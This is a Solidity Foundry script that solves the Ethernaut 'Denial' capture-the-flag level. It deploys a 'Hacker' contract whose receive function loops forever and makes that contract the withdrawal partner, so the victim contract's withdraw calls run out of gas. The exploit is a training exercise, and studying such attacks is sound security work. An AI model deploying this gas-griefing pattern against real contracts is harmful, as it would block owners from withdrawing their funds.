// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

import {Script, console2} from "forge-std/Script.sol";
import {EthernautHelper} from "../setup/EthernautHelper.sol";

// NOTE You can import your helper contracts & create interfaces here
import {Denial} from "../../challenge-contracts/20-Denial.sol";

contract DenialSolution is Script, EthernautHelper {
    address constant LEVEL_ADDRESS = 0x2427aF06f748A6adb651aCaB0cA8FbC7EaF802e6;
    uint256 heroPrivateKey = vm.envUint("PRIVATE_KEY");

    function run() public {
        vm.startBroadcast(heroPrivateKey);
        // NOTE this is the address of your challenge contract
        // address challengeInstance = createInstance(LEVEL_ADDRESS);
        address challengeInstance = 0x790D1b9105DccaE52d6e4CA17f695dD3A071236B; // Hard coding

        ////////////////////////////////////////////////////////////////////////////////////
        // Start of Ric Li C's Solution
        ////////////////////////////////////////////////////////////////////////////////////
        // Step 1: Deploy Hacker contract;
        Hacker hacker = new Hacker(payable(challengeInstance));

        // Step 2: Call `denyWithdraw()` function of the Hacker contract,
        hacker.denyWithdraw();

        // Step 3: Make sure the `withdraw()` function will fail.
        // Denial denial = Denial(payable(challengeInstance));
        // vm.expectRevert("out of gas");
        // denial.withdraw();
        // address heroAddress = vm.addr(heroPrivateKey);
        // console2.log("Current user is", heroAddress);

        ////////////////////////////////////////////////////////////////////////////////////
        // End of Ric Li C's Solution
        ////////////////////////////////////////////////////////////////////////////////////

        // SUBMIT CHALLENGE. (DON'T EDIT)
        bool levelSuccess = submitInstance(challengeInstance);
        require(levelSuccess, "Challenge not passed yet");
        vm.stopBroadcast();

        console2.log(successMessage(20));
    }
}

////////////////////////////////////////////////////////////////////////////////////
// Start of Ric Li C's Solution (Extra Contract)
// Additional contract codes to help solve this puzzle
////////////////////////////////////////////////////////////////////////////////////
contract Hacker {
    Denial target;

    constructor(address targetAddress) {
        target = Denial(payable(targetAddress));
    }

    receive() external payable {
        while (true) {}
    }

    function denyWithdraw() external {
        target.setWithdrawPartner(address(this));
    }
}
////////////////////////////////////////////////////////////////////////////////////
// End of Ric Li C's Solution (Extra Contract)
////////////////////////////////////////////////////////////////////////////////////
